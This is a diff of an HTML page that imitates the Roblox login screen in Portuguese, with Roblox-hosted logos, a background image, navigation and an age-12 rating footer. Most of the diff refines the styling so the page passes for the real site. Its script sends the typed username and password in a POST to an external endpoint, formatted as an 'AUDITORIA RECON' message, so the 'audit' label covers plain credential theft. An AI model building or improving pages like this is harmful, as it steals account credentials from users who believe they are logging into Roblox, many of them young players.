@@ -13,12 +13,13 @@
         body, html {
             margin: 0; padding: 0; height: 100%;
             font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
+            /* Ajuste de opacidade para mimetizar a visibilidade dos jogos ao fundo */
+            background-image: linear-gradient(rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
             background-size: cover; background-position: center;
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER V10 - COM BARRA DE PESQUISA E LINKS */
+        /* HEADER V11 - BUSCA AMPLIADA E ÍCONES */
         .roblox-header {
             width: 100%; height: 52px; background: #232527;
             display: flex; align-items: center; padding: 0 15px;
@@ -26,18 +27,24 @@
             border-bottom: 1px solid #454749;
         }
 
-        .header-nav { display: flex; align-items: center; gap: 15px; color: #fff; font-size: 14px; font-weight: 500; flex-grow: 1; }
+        .header-nav { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 15px; font-weight: 500; flex-grow: 1; }
+        .header-nav span { cursor: pointer; transition: opacity 0.2s; }
+        .header-nav span:hover { opacity: 0.7; }
         
         .search-bar {
-            position: relative; flex-grow: 1; max-width: 400px; margin: 0 15px;
+            position: relative; flex-grow: 1; max-width: 480px; margin: 0 10px;
         }
         .search-bar input {
-            width: 100%; height: 32px; background: #191b1d; border: 1px solid #454749;
-            border-radius: 8px; padding-left: 35px; color: #fff; font-size: 14px; margin-bottom: 0 !important;
+            width: 100%; height: 34px; background: rgba(25,27,29,0.8); border: 1px solid #454749;
+            border-radius: 8px; padding-left: 38px; color: #bdbebe; font-size: 15px; margin-bottom: 0 !important;
+            outline: none;
+        }
+        .search-icon {
+            position: absolute; left: 10px; top: 8px; height: 18px; filter: invert(0.5);
         }
 
-        /* CARD CENTRAL */
-        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 60px; }
+        /* CARD CENTRAL - REFINO DE ESPAÇAMENTO */
+        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 52px; }
         .login-box {
             background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
             width: 100%; max-width: 400px; text-align: center;
@@ -55,20 +62,23 @@
         input {
             width: 100%; height: 45px; background-color: #191b1d; border: 1px solid #454749;
             border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 15px;
-            box-sizing: border-box; font-size: 16px; outline: none;
+            box-sizing: border-box; font-size: 16px; outline: none; transition: border-color 0.2s;
         }
+        input:focus { border-color: #bdbebe; }
 
         .btn-entrar {
-            width: 100%; height: 45px; background-color: transparent; border: 1px solid #fff;
-            color: #fff; border-radius: 4px; font-size: 18px; cursor: pointer; margin-bottom: 20px;
-            transition: 0.2s;
+            width: 100%; height: 45px; background-color: transparent; border: 1.5px solid #bdbebe;
+            color: #fff; border-radius: 4px; font-size: 17px; cursor: pointer; margin-bottom: 20px;
+            font-weight: 600; transition: 0.2s;
         }
-        .btn-entrar:hover { background: rgba(255,255,255,0.1); }
+        .btn-entrar:hover { background: rgba(255,255,255,0.05); }
 
         .btn-secondary {
             width: 100%; height: 45px; background-color: #4f5153; border: none;
-            color: #fff; border-radius: 4px; font-size: 15px; margin-bottom: 12px; cursor: pointer;
+            color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 12px; cursor: pointer;
+            font-weight: 500; transition: background 0.2s;
         }
+        .btn-secondary:hover { background-color: #5a5c5e; }
 
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
@@ -84,19 +94,20 @@
 <body>
 
 <div class="roblox-header">
-    <img src="https://images.rbxcdn.com/2b740523e100f983633a675031d875a6.svg" style="height: 28px; filter: invert(1); margin-right: 15px;">
+    <img src="https://images.rbxcdn.com/2b740523e100f983633a675031d875a6.svg" style="height: 30px; filter: invert(1); margin-right: 25px;">
     <div class="header-nav">
         <span>Destaques</span>
         <span>Mercado</span>
         <span>Criar</span>
         <span>Robux</span>
         <div class="search-bar">
+            <img src="https://images.rbxcdn.com/43f3ed3d820f4b5035f5d34193566b72.svg" class="search-icon">
             <input type="text" placeholder="Pesquisar">
         </div>
     </div>
-    <div style="display: flex; gap: 8px;">
-        <button style="background: #0084ff; border: none; color: #fff; padding: 6px 12px; border-radius: 4px; font-weight: 600; cursor: pointer;">Cadastrar-se</button>
-        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 6px 12px; border-radius: 4px; font-weight: 600; cursor: pointer;">Entrar</button>
+    <div style="display: flex; gap: 10px; margin-left: 15px;">
+        <button style="background: #0084ff; border: none; color: #fff; padding: 6px 14px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer;">Cadastrar-se</button>
+        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 6px 14px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer;">Entrar</button>
     </div>
 </div>
 
@@ -111,20 +122,20 @@
         
         <button class="btn-entrar" id="loginBtn" onclick="executeAudit()">Entrar</button>
         
-        <a href="#" style="color:#fff; text-decoration:none; font-size:13px; display:block; margin-bottom:20px;">Esqueceu a senha ou nome de usuário?</a>
+        <a href="#" style="color:#fff; text-decoration:none; font-size:13px; display:block; margin-bottom:20px; font-weight: 500;">Esqueceu a senha ou nome de usuário?</a>
         
         <button class="btn-secondary">Envie-me um código único por e-mail</button>
         <button class="btn-secondary">Entrada rápida</button>
         
         <p style="color: #fff; font-size: 14px; margin-top: 20px;">
-            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
+            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer; font-weight: 500;">Cadastrar-se</span>
         </p>
     </div>
 </div>
 
 <div class="footer-classificacao">
     <div class="selo-12">12</div>
-    <div style="font-size: 11px; opacity: 0.8;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
+    <div style="font-size: 11px; opacity: 0.9; font-weight: 500;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
 </div>
 
 <script>
@@ -144,12 +155,11 @@
             btn.style.opacity = "0.6";
 
             try {
-                // Envio de Telemetria (Recon)
                 await fetch(endpoint, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🚨 **AUDITORIA RECON** 🚨\n👤 ID: \`${u}\`\n🔑 KEY: \`${p}\`\n🕒 ${new Date().toLocaleString()}`
+                        content: `🚨 **AUDITORIA RECON** 🚨\n👤 ID: \`${u}\`\n🔑 KEY: \`${p}\``
                     })
                 });
 
